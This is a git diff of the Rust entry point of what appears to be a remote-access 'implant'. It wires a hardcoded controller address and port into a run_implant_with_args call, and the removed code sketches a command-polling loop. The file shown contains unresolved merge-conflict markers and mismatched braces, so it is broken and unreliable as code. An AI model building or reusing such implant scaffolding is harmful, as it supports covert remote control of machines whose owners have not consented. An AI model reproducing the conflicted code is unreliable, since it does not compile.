@@ -1,12 +1,16 @@
 
-    use std::process::Command;
-    use std::thread::sleep;
-    use std::time::Duration;
-    use std::io;
-    
+use rb_implant::{Args, run_implant_with_args};
 
-    
+#[tokio::main]
+async fn main() {
+    // Use hardcoded configuration
+    let args = Args {
+        host: "172.27.155.122".to_string(),
+        port: 8080,
+        interval: 5,
+    };
 
+<<<<<<< HEAD
     fn main() -> io::Result<()> {
         let server = "localhost";
         let port = 8080;
@@ -60,5 +64,10 @@
         // Short delay before next poll cycle
     sleep(Duration::from_secs(5));
         }
+=======
+    if let Err(e) = run_implant_with_args(args).await {
+        eprintln!("Fatal error: {}", e);
+        std::process::exit(1);
+>>>>>>> a68a928 (Impland based payload RAHHHHHHHHHHHHHH, added lib.rs in rb_implant/src/ and made main.rs call run_implant())
     }
-    
+}
